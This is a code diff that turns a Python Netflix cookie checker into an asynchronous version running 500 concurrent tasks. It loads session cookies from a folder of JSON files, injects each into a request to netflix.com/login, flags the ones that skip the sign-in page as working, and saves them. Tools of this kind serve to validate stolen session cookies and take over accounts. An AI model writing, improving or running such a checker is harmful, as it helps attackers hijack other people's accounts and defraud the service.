@@ -1,91 +1,102 @@
 import json
 import os
 import sys
-import requests
+import aiohttp
+import asyncio
 import time
 
-try:
-    working_cookies_path = "working_cookies"
-    exceptions = 0
-    working_cookies = 0
-    expired_cookies = 0
-    start = time.time()
+print("Initializing!, Please wait...\n")
+working_cookies_path = "working_cookies"
+exceptions = 0
+working_cookies = 0
+expired_cookies = 0
+start = time.time()
 
-    def maximum():
-        count = 0
-        for root_dir, cur_dir, files in os.walk(r"json_cookies"):
-            count += len(files)
-            return count
+num_threads = 500  # Define the number of threads here
 
-    def load_cookies_from_json(json_cookies_path):
-        with open(json_cookies_path, "r", encoding="utf-8") as cookie_file:
-            cookie = json.load(cookie_file)
-        return cookie
+# ___________________________________________
+# | Network Speed | Recommended no. threads |
+# |---------------|-------------------------|
+# | < 5 Mbps      | 1-3                     |
+# | 5-20 Mbps     | 3-5                     |
+# | 20-100 Mbps   | 5-10                    |
+# | > 100 Mbps    | 10-20                   |
+# |_________________________________________|
 
-    def open_webpage_with_cookies(link, json_cookies):
-        global working_cookies
-        global expired_cookies
+async def load_cookies_from_json(json_cookies_path):
+    with open(json_cookies_path, "r", encoding="utf-8") as cookie_file:
+        cookie = json.load(cookie_file)
+    return cookie
 
-        session = requests.Session()
-        session.headers.update(
-            {
-                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
-            }
-        )
 
-        # Request the page
-        session.get(link)
+async def open_webpage_with_cookies(session, link, json_cookies, filename):
+    global working_cookies
+    global expired_cookies
 
-        # Clear all existing cookies
-        session.cookies.clear()
+    # Request the page
+    await session.get(link)
 
-        for cookie in json_cookies:
-            session.cookies.set(cookie["name"], cookie["value"])
+    # Clear all existing cookies
+    session.cookie_jar.clear()
 
-        response = session.get(link)
+    for cookie in json_cookies:
+        session.cookie_jar.update_cookies({cookie["name"]: cookie["value"]})
 
-        if "Sign In" in response.text or "btn" in response.text:
+    async with session.get(link) as response:
+        content = await response.text()
+        if "Sign In" in content or "btn" in content:
             print(f"Cookie Not working - {filename}")
             expired_cookies += 1
         else:
             print(f"Working cookie found! - {filename}")
             try:
                 os.mkdir(working_cookies_path)
-                with open(f"working_cookies/{filename})", "w", encoding="utf-8") as a:
-                    a.write(content)
                 working_cookies += 1
+                return content  # Return content if the cookie is working
             except FileExistsError:
-                with open(f"working_cookies/{filename}", "w", encoding="utf-8") as a:
-                    a.write(content)
                 working_cookies += 1
+                return content  # Return content if the cookie is working
 
+
+async def process_cookie_file(filename):
+    filepath = os.path.join("json_cookies", filename)
+    if os.path.isfile(filepath):
+        with open(filepath, "r", encoding="utf-8"):
+            url = "https://netflix.com/login"
+            try:
+                cookies = await load_cookies_from_json(filepath)
+                async with aiohttp.ClientSession() as session:
+                    content = await open_webpage_with_cookies(session, url, cookies, filename)
+                    if content:
+                        # Save working cookies to JSON file
+                        with open(f"working_cookies/{filename}.json", "w") as json_file:
+                            json.dump(cookies, json_file)
+            except json.decoder.JSONDecodeError:
+                print(f"Please use cookie_converter.py to convert your cookies to json format! (File: {filename})\n")
+                global exceptions
+                exceptions += 1
+            except Exception as e:
+                print(f"Error occurred: {str(e)} - {filename}\n")
+                exceptions += 1
+
+
+async def main():
+    tasks = []
     for filename in os.listdir("json_cookies"):
-        filepath = os.path.join("json_cookies", filename)
-        if os.path.isfile(filepath):
-            with open(filepath, "r", encoding="utf-8") as file:
-                content = file.read()
+        task = asyncio.create_task(process_cookie_file(filename))
+        tasks.append(task)
+        if len(tasks) >= num_threads:
+            await asyncio.gather(*tasks)
+            tasks = []
+    if tasks:
+        await asyncio.gather(*tasks)
 
-                url = "https://netflix.com/login"
 
-                try:
-                    cookies = load_cookies_from_json(filepath)
-                    open_webpage_with_cookies(url, cookies)
-
-                except json.decoder.JSONDecodeError:
-                    print(
-                        f"Please use cookie_converter.py to convert your cookies to json format! (File: {filename})\n"
-                    )
-                    exceptions += 1
-                    break
-
-                except Exception as e:
-                    print(f"Error occurred: {str(e)} - {filename}\n")
-                    exceptions += 1
-
+try:
+    asyncio.run(main())
     end = time.time()
     print(
-        f"\nSummary:\nTotal cookies: {maximum()}\nWorking cookies: {working_cookies}\nExpired cookies: {maximum() - working_cookies}\nInvalid cookies: {exceptions}\nTime Elapsed: {end - start} Seconds"
-    )
+        f"\nSummary:\nTotal cookies: {len(os.listdir('json_cookies'))}\nWorking cookies: {working_cookies}\nExpired cookies: {expired_cookies}\nInvalid cookies: {exceptions}\nTime Elapsed: {end - start} Seconds")
 except KeyboardInterrupt:
     print("\n\nProgram Interrupted by user")
     sys.exit()
